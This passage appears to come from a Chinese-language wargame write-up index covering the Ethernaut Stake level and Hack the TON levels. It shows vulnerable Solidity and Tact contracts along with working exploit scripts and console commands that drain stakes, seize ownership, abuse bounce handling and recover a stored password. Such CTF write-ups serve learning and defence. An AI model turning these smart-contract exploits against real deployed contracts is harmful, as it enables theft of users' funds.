documentation","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#31-stake","text":"To complete this level, the contract state must meet the following conditions: The Stake contract's ETH balance has to be greater than 0 totalStaked must be greater than the Stake contract's ETH balance You must be a staker Your staked balance must be 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Stake { uint256 public totalStaked ; mapping ( address => uint256 ) public UserStake ; mapping ( address => bool ) public Stakers ; address public WETH ; constructor ( address _weth ) payable { totalStaked += msg . value ; WETH = _weth ; } function StakeETH () public payable { require ( msg . value > 0.001 ether , \"Don't be cheap\" ); totalStaked += msg . value ; UserStake [ msg . sender ] += msg . value ; Stakers [ msg . sender ] = true ; } function StakeWETH ( uint256 amount ) public returns ( bool ){ require ( amount > 0.001 ether , \"Don't be cheap\" ); (, bytes memory allowance ) = WETH . call ( abi . encodeWithSelector ( 0xdd62ed3e , msg . sender , address ( this ))); require ( bytesToUint ( allowance ) >= amount , \"How am I moving the funds honey?\" ); totalStaked += amount ; UserStake [ msg . sender ] += amount ; ( bool transfered , ) = WETH . call ( abi . encodeWithSelector ( 0x23b872dd , msg . sender , address ( this ), amount )); Stakers [ msg . sender ] = true ; return transfered ; } function Unstake ( uint256 amount ) public returns ( bool ){ require ( UserStake [ msg . sender ] >= amount , \"Don't be greedy\" ); UserStake [ msg . sender ] -= amount ; totalStaked -= amount ; ( bool success , ) = payable ( msg . sender ). call { value : amount }( \"\" ); return success ; } function bytesToUint ( bytes memory data ) internal pure returns ( uint256 ) { require ( data . length >= 32 , \"Data length must be at least 32 bytes\" ); uint256 result ; assembly { result := mload ( add ( data , 0x20 )) } return result ; } } \u7528\u6237\u6210\u4e3a\u8d28\u62bc\u8005\u4e4b\u540e\u8eab\u4efd\u4e0d\u4f1a\u88ab\u53d6\u6d88 \u901a\u8fc7 StakeWETH() \u53ef\u4ee5\u4f7f totalStaked \u589e\u52a0\u800c\u4e0d\u5f71\u54cd\u5408\u7ea6 Stake \u7684\u4f59\u989d\uff0c\u53e6\u5916\uff0c\u91c7\u7528\u4e86\u4f4e\u7ea7\u8c03\u7528\u6765\u8c03\u7528 WETH \u7684 transferFrom() \u4e14\u6ca1\u6709\u68c0\u67e5\u8fd4\u56de\u503c Unstake() \u53ea\u80fd\u53d6\u51fa\u5408\u7ea6\u4e2d\u7684\u4ee5\u592a\uff0c\u540c\u6837\u672a\u68c0\u67e5\u4f4e\u7ea7\u8c03\u7528\u7684\u8fd4\u56de\u503c \u8981\u540c\u65f6\u6ee1\u8db3\u7528\u6237\u8d28\u62bc\u6570\u91cf\u4e3a 0 \u4e14 totalStaked \u8981\u5927\u4e8e\u5408\u7ea6 Stake \u7684\u4f59\u989d\uff0c\u9700\u8981\u53e6\u4e00\u4e2a\u7528\u6237\u901a\u8fc7 StakeETH() \u8d28\u62bc\u4ee5\u592a\u5e01\u3002\u800c\u7528\u6237\u4f7f\u7528 StakeWETH() \u53ef\u4ee5\u5728\u4e0d\u6301\u6709 WETH \u7684\u60c5\u51b5\u4e0b\u589e\u52a0 totalStaked \u548c UserStake[msg.sender] \uff0c\u6700\u540e\u4f7f\u7528 Unstake() \u53d6\u51fa\u5176\u4ed6\u7528\u6237\u8d28\u62bc\u7684\u4ee5\u592a\u5e01\u5e76\u6e05\u7a7a\u8d28\u62bc","title":"31. Stake"},{"location":"wargames/ethernaut/#exploit_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 from cheb3 import Connection from cheb3.utils import compile_sol source = ''' interface IStake { function WETH() external view returns (address); function StakeETH() external payable; function StakeWETH(uint256 amount) external returns (bool); function Unstake(uint256 amount) external returns (bool); } interface IWETH { function approve(address spender, uint amount) external; } contract Helper { function stake(address _stake) payable external { IStake(_stake).StakeETH{value: msg.value}(); } } ''' compiled = compile_sol ( source , solc_version = \"0.8.0\" ) helper_abi , helper_bin = compiled [ \"Helper\" ] stake_abi , _ = compiled [ \"IStake\" ] weth_abi , _ = compiled [ \"IWETH\" ] conn = Connection ( \"<rpc-url>\" ) account = conn . account ( \"<private-key>\" ) stake_addr = \"<instance>\" helper = conn . contract ( account , abi = helper_abi , bytecode = helper_bin ) helper . deploy () helper . functions . stake ( stake_addr ) . send_transaction ( value = int ( 1e16 ) + 1 ) stake = conn . contract ( account , abi = stake_abi , address = stake_addr ) weth_addr = stake . caller . WETH () weth = conn . contract ( account , abi = weth_abi , address = weth_addr ) weth . functions . approve ( stake_addr , int ( 1e18 )) . send_transaction () stake . functions . StakeWETH ( int ( 1e16 )) . send_transaction () stake . functions . Unstake ( int ( 1e16 )) . send_transaction ()","title":"Exploit"},{"location":"wargames/hack_the_ton/","tags":["blockchain","smart contract","ton","tact","tolk","func","fift"],"text":"#blockchain #smart contract #ton #tact #tolk #func #fift .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } 0. INTRODUCTION \u00b6 \u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4e2d\u4f7f\u7528 help() \u67e5\u770b\u53ef\u4ee5\u4f7f\u7528\u7684\u7a0b\u5e8f\u529f\u80fd (index) description fromNano(nano) \"convert nano units to ton\" toNano(ton) \"convert ton units to nano\" contract \"current level contract instance (if created)\" player \"current player (if wallet connected)\" Address.parse(addressString) \"parse Address from string\" tonConnectUI.sendTransaction(tx, options) \"send custom transaction to arbitrary address\" beginCell() \"start building a cell\" \u5728\u8fde\u63a5\u94b1\u5305\u540e\uff0c\u70b9\u51fb GET NEW INSTANCE \u83b7\u53d6\u4e00\u4e2a\u9898\u76ee\u5b9e\u4f8b \u4e0e Ethernaut \u7c7b\u4f3c\uff0c\u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4f7f\u7528 contract \u83b7\u53d6\u4fe1\u606f\u6216\u4e0e\u5408\u7ea6\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 > await contract . getInfo () \u200b You will find what you need in getInfo1 (). > await contract . getInfo1 () \u200b Try getInfo2 (), but with 'hello' as a parameter . \u200b > await contract . getInfo2 ( \"hello\" ) \u200b Try getInfoNum () to know the number of the next info method to call . \u200b > await contract . getInfoNum () \u200b 42n \u200b > await contract . getInfo42 () \u200b Send message Authenticate if you know the password . > await contract . getPassword () \u200b Tact and FunC for the win ! > await contract . send ( player , { value : toNano ( 0.05 )}, { $$type : \"Authenticate\" , password : \"Tact and FunC for the win!\" }); \u5b8c\u6210\u540e\u70b9\u51fb CHECK SOLUTION \u9a8c\u8bc1 References \u00b6 Send messages to contracts 1. DEPOSIT \u00b6 You will beat this level if: Claim ownership of the contract Reduce its balance to 0 DepositLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; contract DepositLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; } receive () { require ( context (). value >= ton ( \"0.01\" ), \"Not enough TON.\" ); self . owner = sender (); } receive ( \"withdraw\" ) { self . requireOwner (); send ( SendParameters { to : sender (), bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors }); } receive ( \"check\" ) { let ctx : Context = context (); send ( SendParameters { to : ctx . sender , value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"deposit\" , completed : ( myBalance () - ctx . value ) == 0 && self . owner == self . player , }. toCell () }); } get fun balance () : String { return myBalance (). toCoinsString (); } } \u53ea\u6709\u6240\u6709\u8005\u624d\u80fd\u53d6\u51fa\u5408\u7ea6\u6301\u6709\u7684 TON\uff0c\u9996\u5148\u5411\u5408\u7ea6\u53d1\u9001 TON \u4ee5\u6210\u4e3a\u6240\u6709\u8005 1 2 3 > await player . send ({ to : contract . address . toString (), value : toNano ( \"0.05\" )}); // or > await contract . send ( player , { value : toNano ( 0.05 )}, null ); \u4f7f\u7528 withdraw \u53d6\u51fa\u5408\u7ea6\u4e2d\u6240\u6709\u7684\u8d44\u91d1 1 > await contract . send ( player , { value : toNano ( 0.05 )}, \"withdraw\" ); 2. SCANNER \u00b6 Claim ownership of the contract below to complete this level. ScannerLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; contract Child with Deployable { parent : Address ; nonce : Int ; init ( parent : Address , nonce : Int ) { self . parent = parent ; self . nonce = nonce ; } } message SendChildAddress { address : Address ; } contract ScannerLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; child : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Child ( myAddress (), nonce ); self . child = contractAddress ( level_init ); send ( SendParameters { to : self . child , value : ton ( \"0.01\" ), mode : SendPayGasSeparately , bounce : false , data : level_init . data , code : level_init . code , body : Deploy { queryId : 0 , }. toCell () }); } receive ( msg : SendChildAddress ) { require ( msg . address == self . child , \"Wrong child address.\" ); self . owner = sender (); } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"scanner\" , completed : self . owner == self . player }. toCell () }); } } \u8981\u6210\u4e3a\u5408\u7ea6\u7684\u6240\u6709\u8005\u9700\u8981\u77e5\u9053 Child \u5408\u7ea6\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u901a\u8fc7 Tonviewer \u67e5\u770b ScannerLevel \u90e8\u7f72\u7684\u4ea4\u6613\u6765\u83b7\u77e5 \u53d1\u9001 Child \u5408\u7ea6\u5730\u5740 1 > await contract . send ( player , { value : toNano ( \"0.05\" )}, { $$type : \"SendChildAddress\" , address : Address . parse ( \"kQDjT2mQ8ePcmYsBMQDi4JJHPzZNU1nqe_KbqIOwUKZaCX2Z\" )}); 3. BOUNCE \u00b6 Claim ownership of the contract below to complete this level. BounceLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; message Start { time : Int as uint32 ; } message Finish { time : Int as uint32 ; } contract Timer with Deployable { parent : Address ; nonce : Int ; startTime : Int ? as uint32 ; init ( parent : Address , nonce : Int ) { self . parent = parent ; self . nonce = nonce ; } receive ( msg : Start ) { self . startTime = msg . time ; } receive ( msg : Finish ) { if ( self . startTime == null ) { return ; } require ( msg . time - self . startTime !! < 180 , \"Too late.\" ); self . startTime = null ; } } contract BounceLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; timer : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Timer ( myAddress (), nonce ); self . timer = contractAddress ( level_init ); send ( SendParameters { to : self . timer , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( \"start\" ) { send ( SendParameters { to : self . timer , value : 0 , bounce : true , mode : SendRemainingValue , body : Start { time : now () }. toCell () }); } receive ( \"finish\" ) { send ( SendParameters { to : self . timer , value : 0 , bounce : true , mode : SendRemainingValue , body : Finish { time : now () }. toCell () }); } bounced ( _ : Slice ) { self . owner = self . player ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"bounce\" , completed : self . owner == self . player }. toCell () }); } } \u5408\u7ea6 BounceLevel \u6536\u5230\u5f39\u56de\u7684\u6d88\u606f\u540e\u5c31\u4f1a\u5c06\u73a9\u5bb6\u8bbe\u4e3a\u5408\u7ea6\u6240\u6709\u8005 \u53ea\u9700\u8981\u5728\u53d1\u9001\u5b8c start \u7684\u4e09\u5206\u949f\u540e\u5411 BounceLevel \u53d1\u9001 finish \uff0c\u8ba9\u5408\u7ea6 Timer \u629b\u51fa\u9519\u8bef\u5f39\u56de\u6d88\u606f\u5373\u53ef \u6216\u76f4\u63a5\u5411 Timer \u53d1\u9001 start \u8bbe\u7f6e\u81ea\u5b9a\u4e49\u5f00\u59cb\u65f6\u95f4 1 2 3 4 5 6 > await contract . send ( player , { value : toNano ( '0.05' )}, \"start\" ); // or > await player . send ({ to : Address . parse ( \"kQCmY8KG3F2y-2Unxl2jMtJMIUjT9fWhqXWM37hPHWbnPIjp\" ), value : toNano ( \"0.01\" ), body : beginCell (). storeUint ( 1141136470 , 32 ). storeUint ( 0 , 32 ). endCell ()}); // opcode: sha256(\"Start{time:uint32}\") >> 224 > await contract . send ( player , { value : toNano ( '0.05' )}, \"finish\" ); References \u00b6 tact-lang / tact 4. INTRUDER \u00b6 Claim ownership of the contract below to complete this level. IntruderLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 import \"@stdlib/deploy\" ; import \"./messages\" ; message ( 0x6e38a063 ) ChangeLevelOwner { newOwner : Address ; } message ( 0x6f13c225 ) ChangeClientOwner { newOwner : Address ; } message ( 0xa4e501ef ) ChangeOwnerInternal { newOwner : Address ; } contract Manager with Deployable { client : Address ; nonce : Int ; init ( client : Address , nonce : Int ) { self . client = client ; self . nonce = nonce ; } receive ( msg : ChangeClientOwner ) { send ( SendParameters { to : self . client , value : 0 , bounce : false , mode : SendRemainingValue , body : ChangeOwnerInternal { newOwner : msg . newOwner }. toCell () }); } } contract IntruderLevel with Deployable { owner : Address ; player : Address ; nonce : Int ; manager : Address ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Manager ( myAddress (), nonce ); self . manager = contractAddress ( level_init ); send ( SendParameters { to : self . manager , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( msg : ChangeLevelOwner ) { require ( sender () == self . owner , \"Wrong sender.\" ); send ( SendParameters { to : self . manager , value : 0 , bounce : false , mode : SendRemainingValue , body : ChangeClientOwner { newOwner : msg . newOwner }. toCell () }); } receive ( msg : ChangeOwnerInternal ) { require ( sender () == self . manager , \"Wrong sender.\" ); self . owner = msg . newOwner ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"intruder\" , completed : self . owner == self . player }. toCell () }); } get fun owner () : Address { return self . owner ; } } \u53ea\u6709 manager \u80fd\u8bbe\u7f6e\u5408\u7ea6\u7684\u6240\u6709\u8005\uff0c\u800c\u521d\u59cb manager \u4e3a Manager \u5408\u7ea6 \u5408\u7ea6 Manager \u4e0d\u68c0\u67e5 ChangeClientOwner \u6d88\u606f\u7684\u53d1\u9001\u8005 1 2 3 message ( 0x6f13c225 ) ChangeClientOwner { newOwner : Address ; } \u53ef\u4ee5\u5411 Manager \u5408\u7ea6\u53d1\u9001 ChangeClientOwner \u6d88\u606f\u6765\u8bbe\u7f6e IntruderLevel \u5408\u7ea6\u7684\u6240\u6709\u8005 1 > await player . send ({ to : Address . parse ( \"kQCi5Sne638i1fdoGMK7cnKPVuQWgyGO4N4LxneLonWwvgZ_\" ), value : toNano ( \"0.01\" ), body : beginCell (). storeUint ( 0x6f13c225 , 32 ). storeAddress ( player . address ). endCell ()}); 5. PARTIAL \u00b6 The goal of this level is to hack the vault contract below. You are given 100 tokens to start with and you will beat the level if you manage to acquire 1000 or more. PartialLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; message DepositToVault { amount : Int as coins ; } message WithdrawFromVault { amount : Int as coins ; } message DepositInternal { amount : Int as coins ; } message WithdrawInternal { amount : Int as coins ; } contract Vault with Ownable , Deployable { owner : Address ; nonce : Int ; balance : Int as coins = 500 ; init ( owner : Address , nonce : Int ) { self . owner = owner ; self . nonce = nonce ; } receive ( msg : DepositInternal ) { self . requireOwner (); self . balance += msg . amount ; } receive ( msg : WithdrawInternal ) { self . requireOwner (); require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; } get fun balance () : Int { return self . balance ; } } contract PartialLevel with Deployable { player : Address ; nonce : Int ; vault : Address ; balance : Int as coins = 100 ; init ( player : Address , nonce : Int ) { self . player = player ; self . nonce = nonce ; let level_init : StateInit = initOf Vault ( myAddress (), nonce ); self . vault = contractAddress ( level_init ); send ( SendParameters { to : self . vault , value : ton ( \"0.01\" ), bounce : false , data : level_init . data , code : level_init . code }); } receive ( msg : DepositToVault ) { require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : false , mode : SendRemainingValue , body : DepositInternal { amount : msg . amount }. toCell () }); } receive ( msg : WithdrawFromVault ) { self . balance += msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : true , mode : SendRemainingValue , body : WithdrawInternal { amount : msg . amount }. toCell () }); } bounced ( msg : WithdrawInternal ) { self . balance -= msg . amount ; } receive ( \"check\" ) { send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"partial\" , completed : self . balance >= 1000 }. toCell () }); } get fun balance () : Int { return self . balance ; } } \u901a\u8fc7 WithdrawFromVault \u53ef\u4ee5\u589e\u52a0\u5408\u7ea6\u7684\u4f59\u989d\uff0c\u4f46\u82e5 WithdrawInternal \u6267\u884c\u5931\u8d25\uff0c\u5c06\u56de\u5f39\u6d88\u606f\u5e76\u56de\u6eda\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 contract Vault with Ownable , Deployable { // [...] receive ( msg : WithdrawInternal ) { self . requireOwner (); require ( self . balance >= msg . amount , \"Not enough balance.\" ); self . balance -= msg . amount ; } // [...] } contract PartialLevel with Deployable { // [...] receive ( msg : WithdrawFromVault ) { self . balance += msg . amount ; send ( SendParameters { to : self . vault , value : 0 , bounce : true , mode : SendRemainingValue , body : WithdrawInternal { amount : msg . amount }. toCell () }); } bounced ( msg : WithdrawInternal ) { self . balance -= msg . amount ; } // [...] } \u5728 TON \u4e2d\uff0c \u5982\u679c\u652f\u4ed8\u7684\u8d39\u7528\u4e0d\u8db3\u4ee5\u5b8c\u6210\u6267\u884c\uff0c\u5219\u4e0d\u4f1a\u521b\u5efa\u56de\u5f39\u6d88\u606f\u3002\u56e0\u6b64\u53ea\u9700\u8981\u652f\u4ed8\u4ec5\u4f9b WithdrawFromVault \u6267\u884c\u7684\u8d39\u7528\uff0c\u4f7f\u4f59\u989d\u589e\u52a0\u5373\u53ef 1 2 > await contract . send ( player , { value : toNano ( \"0.005\" )}, { $$type : \"WithdrawFromVault\" , amount : 900 }); // https://testnet.tonviewer.com/transaction/407df39b95d852f44d1b1a9b8176bc68a44701bc2afabd7b069110faba553a5f References \u00b6 Internal message 6. PEEK \u00b6 Unlock the contract below to complete this level. PeekLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { password : Int as uint32 ; } contract PeekLevel with Deployable { player : Address ; nonce : Int ; password : Int as uint32 ; locked : Bool = true ; init ( player : Address , nonce : Int , password : Int ){ self . player = player ; self . nonce = nonce ; self . password = password ; } receive ( msg : Unlock ){ require ( msg . password == self . password , \"Wrong password.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"peek\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u63d0\u4f9b\u6b63\u786e\u7684\u5bc6\u7801\u5373\u53ef\u89e3\u9501\uff0c\u9700\u8981\u89e3\u6790 \u521d\u59cb\u5316\u6d88\u606f \u90e8\u7f72 Tact \u7f16\u5199\u7684\u5408\u7ea6\uff0c\u51fd\u6570 init() \u7684\u53c2\u6570\u5305\u542b\u5728 init data \u4e2d\uff0c\u5e76\u5c06\u5728\u90e8\u7f72\u9644\u5e26\u7684\u7b2c\u4e00\u6b21\u5408\u7ea6\u8c03\u7528\u4e2d\u6839\u636e init data \u66f4\u65b0\u5b58\u50a8 \u4f7f\u7528 pytoniq-core \u89e3\u6790\u521d\u59cb\u6570\u636e \u5c3d\u7ba1\u53ef\u4ee5\u4f7f\u7528\u8f83\u5c0f\u7684 Int \u8868\u793a\u5f62\u5f0f\u6765\u51cf\u5c11\u5b58\u50a8\u5f00\u9500\uff0c\u4f46 TVM \u4ec5\u5bf9 257 \u4f4d\u6574\u578b\u8fdb\u884c\u64cd\u4f5c\u3002\u56e0\u6b64\uff0cinit data \u4e2d\u7684\u6574\u578b\u53c2\u6570\u5747\u4e3a 257 \u4f4d\u6709\u7b26\u53f7\u6574\u6570 1 2 3 4 5 6 7 8 9 10 11 12 from pytoniq_core import Cell , Slice init = Cell . one_from_boc ( 'b5ee9c720102120100034600020134040101c340007a7155b50ef485eb69331e4e6a963457a71a0d34a960e74e38724741ddb27b00000000000000000000000000000000000000000000000000000000000000005800000000000000000000000000000000000000000000000000000000abad86ee020101c0030105a1a75f040114ff00f4a413f4bcf2c80b05020162060702ead001d0d3030171b0a301fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088545053036f04f86102f862db3c5513db3cf2e082c8f84301cc7f01ca005530504320d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf16810101cf0012cb1fca00c9ed540f080201200d0e02eeeda2edfb0192307fe07021d749c21f953020d70b1fde2082102194da8eba8e1c30d31f0182102194da8ebaf2e081d31f0131816dde3222baf2f4707fe0208210946a98b6ba8ea830d31f018210946a98b6baf2e081d33f0131c8018210aff90f5758cb1fcb3fc9f84201706ddb3c7fe0c0009130e30d70090a013a6d6d226eb3995b206ef2d0806f22019132e2102470030480425023db3c0b01aef90182f0b92ab1b3504a092e6e10b90beb85a7ceb990452ba73c09375bf2dd2a56cbcf7fba8eaff842708040708b47065656b825c000c85982106df37b4d5003cb1fc858cf16c901ccca00c91443306d6ddb3c7fdb31e00b01cac87101ca01500701ca007001ca02500520d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e088cf165003fa027001ca68236eb3917f93246eb3e2973333017001ca00e30d216eb39c7f01ca0001206ef2d08001cc95317001ca00e2c901fb000c00987f01ca00c87001ca007001ca00246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e2246eb39d7f01ca0004206ef2d0805004cc9634037001ca00e27001ca00027f01ca0002c958cc0211becdbed9e6d9e3620c0f100011be15f76a268690000c01eced44d0d401f863d200018e2dfa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700d31fd20055306c14e0f828d70b0a8309baf2e089fa400120d74981010bbaf2e08820d70b0a208104ffbaf2d0898309baf2e08801810101d700810101d700552003d158db3c1100022000027f' ) init_slice = init . begin_parse () init_slice . load_ref () # skip init code init_data = init_slice . load_ref () data_slice = init_data . begin_parse () data_slice . load_ref () # skip tact context system data_slice . load_int ( 1 ) # skip init status data_slice . load_address () # player data_slice . load_int ( 257 ) # nonce print ( data_slice . load_int ( 257 )) # password \u53d1\u9001\u89e3\u9501\u6d88\u606f 1 > await contract . send ( player , { value : toNano ( \"0.005\" )}, { $$type : \"Unlock\" , password : 720069051 }); References \u00b6 yungwine / pytoniq-core Serialization 7. SWAP \u00b6 You will beat the level if you manage to acquire tokens amount equivalent to 1000 TON or more. SwapLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"../messages\" ; message SwapTonToTokens { amount : Int as coins ; } message RequestBalance { sender : Address ; } message ResponseBalance { sender : Address ; balance : Int as coins ; } contract Token with Ownable , Deployable { owner : Address ; nonce : Int ; balance : Int as coins = 0 ; init ( owner : Address , nonce : Int ){ self . owner = owner ; self . nonce = nonce ; } receive ( msg : SwapTonToTokens ){ self . requireOwner (); self . balance += msg . amount ; send ( SendParameters { to : sender (), value : 0 , bounce : false , mode : SendRemainingValue , body : \"send ton\" . asComment () } ); } receive ( \"swap tokens to ton\" ){ self . requireOwner (); self . balance = 0 ; send ( SendParameters { to : sender (), bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( msg : RequestBalance ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : ResponseBalance { sender : msg . sender , balance : self . balance }. toCell () } ); } get fun balance () : Int { return self . balance ; } } contract SwapLevel with Deployable { player : Address ; nonce : Int ; token : Address ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; let token_init : StateInit = initOf Token ( myAddress (), nonce ); self . token = contractAddress ( token_init ); send ( SendParameters { to : self . token , value : ton ( \"0.01\" ), bounce : false , data : token_init . data , code : token_init . code } ); } receive (){} receive ( \"swap ton to tokens\" ){ send ( SendParameters { to : self . token , value : 0 , bounce : false , mode : SendRemainingValue , body : SwapTonToTokens { amount : myBalance () - context (). value }. toCell () }); } receive ( \"swap tokens to ton\" ){ send ( SendParameters { to : self . token , value : 0 , bounce : false , mode : SendRemainingValue , body : \"swap tokens to ton\" . asComment () } ); } receive ( \"send ton\" ){ require ( sender () == self . token , \"Wrong sender.\" ); send ( SendParameters { to : self . token , bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( \"withdraw\" ){ send ( SendParameters { to : self . player , bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors } ); } receive ( \"check\" ){ send ( SendParameters { to : self . token , value : 0 , mode : SendRemainingValue , bounce : false , body : RequestBalance { sender : sender ()}. toCell () } ); } receive ( msg : ResponseBalance ){ require ( sender () == self . token , \"Wrong sender.\" ); send ( SendParameters { to : msg . sender , value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"swap\" , completed : msg . balance >= ton ( \"1000\" ) }. toCell () } ); } } \u64cd\u4f5c swap ton to tokens \u6bcf\u6b21\u80fd\u4f7f Token \u7684 balance \u589e\u52a0 myBalance() - context().value \uff0c\u5373\u5408\u7ea6 SwapLevel \u6301\u6709\u7684 TON \u8d8a\u591a\uff0c\u6bcf\u6b21\u7684\u589e\u52a0\u91cf\u8d8a\u5927\u3002\u5411\u5408\u7ea6 SwapLevel \u53d1\u9001 TON \u589e\u52a0\u5176\u4f59\u989d\u4ee5\u51cf\u5c11\u64cd\u4f5c\u7684\u6b21\u6570 1 await contract . send ( player , { value : toNano ( \"4\" )}, null ); \u5408\u7ea6 Token \u6267\u884c\u64cd\u4f5c SwapTonToTokens \u65f6\uff0c\u4f1a\u5411\u5408\u7ea6 SwapLevel \u53d1\u9001 send ton \u6d88\u606f\uff0c\u4f7f\u5176\u5c06\u6240\u6301\u6709\u7684\u5168\u90e8 TON \u53d1\u9001\u7ed9\u5408\u7ea6 Token \u3002\u9700\u8981\u63a7\u5236 swap ton to tokens \u6d88\u606f\u9644\u5e26\u7684 TON\uff0c\u4f7f\u5408\u7ea6 SwapLevel \u65e0\u6cd5\u5c06\u4f59\u989d\u53d1\u9001\u7ed9\u5408\u7ea6 Token \u3002\u7ecf\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528 0.008 TON 1 > await contract . send ( player , { value : toNano ( \"0.008\" )}, \"swap ton to tokens\" ); \u4f7f\u7528 TON Web IDE \u90e8\u7f72 \u8f85\u52a9\u5408\u7ea6 